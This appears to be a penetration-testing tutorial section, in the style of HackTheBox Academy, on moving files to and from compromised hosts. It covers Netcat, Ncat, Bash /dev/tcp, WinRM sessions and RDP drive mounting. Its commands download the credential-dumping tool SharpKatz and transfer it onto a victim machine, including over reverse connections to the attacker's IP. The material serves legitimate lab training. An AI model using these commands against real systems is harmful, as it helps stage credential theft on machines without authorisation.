## Miscellaneous File Transfer Methods

We've covered various methods for transferring files on Windows and Linux. We also explored ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section will cover alternative methods such as transferring files using **Netcat**, **Ncat**, and **using RDP and PowerShell sessions**.

---

#### **Netcat**

Netcat (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means it can be used for file transfer operations.

The original Netcat was released by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce **Ncat**, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

In this section, we will use both the original Netcat and Ncat.

> **Note**: Ncat is used in HackTheBox's PwnBox as `nc`, `ncat`, and `netcat`.

---

#### **File Transfer with Netcat and Ncat**

The target or attacking machine can initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example to transfer a tool to our target.

##### Example 1: Using Netcat (Original)

1. On the **compromised machine**, start Netcat listening with:
    
    ```
    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
    ```
    
2. From the **attacking host**, send the file with:
    
    ```
    0xs5@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
    0xs5@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
    ```
    

##### Example 2: Using Ncat

1. On the **compromised machine**, start Ncat with:
    
    ```
    victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
    ```
    
2. From the **attacking host**, send the file with:
    
    ```
    0xs5@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
    ```
    

##### Reverse File Transfer

Instead of listening on the compromised machine, we can:

1. On the **attacking host**, listen with:
    
    ```
    0xs5@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
    ```
    
2. On the **compromised machine**, connect to the attacker with:
    
    ```
    victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
    ```
    

##### Alternative Using Bash

If Netcat/Ncat is unavailable on the compromised machine, Bash can perform read/write operations on `/dev/tcp/`:

1. On the **attacking host**:
    
    ```
    0xs5@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
    ```
    
2. On the **compromised machine**:
    
    ```
    victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
    ```
    

---

#### **PowerShell Session File Transfer**

PowerShell Remoting, aka WinRM, can transfer files when HTTP, HTTPS, or SMB are unavailable. PowerShell Remoting uses:

- **TCP/5985** for HTTP
    
- **TCP/5986** for HTTPS
    

##### Example: File Transfer via WinRM

1. Confirm connectivity from **DC01** to **DATABASE01**:
    
    ```
    PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
    ```
    
2. Create a session:
    
    ```
    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
    ```
    
3. Transfer files:
    
    - From DC01 to DATABASE01:
        
        ```
        PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
        ```
        
    - From DATABASE01 to DC01:
        
        ```
        PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
        ```
        

---

#### **RDP File Transfer**

**RDP (Remote Desktop Protocol)** allows file transfers using copy/paste or mounting local resources:

1. **From Linux**:
    
    - Using `rdesktop`:
        
        ```
        0xs5@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
        ```
        
    - Using `xfreerdp`:
        
        ```
        0xs5@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
        ```
        
2. **From Windows**:
    
    - Use **mstsc.exe** to share a local drive during connection.
        

> **Note**: Mounted drives are private to the session and inaccessible to other users.

---

#### **Practice Makes Perfect**

Mastering these techniques is essential for real-world assessments and labs. Apply them in:

- **Active Directory Enumeration and Attacks**
    
- **Pivoting, Tunneling & Port Forwarding**
    
- **Attacking Enterprise Networks**
    
- **Shells & Payloads**
    

Experiment with each method to build muscle memory and adaptability for different environments. In the next section, we'll discuss protecting file transfers when dealing with sensitive data.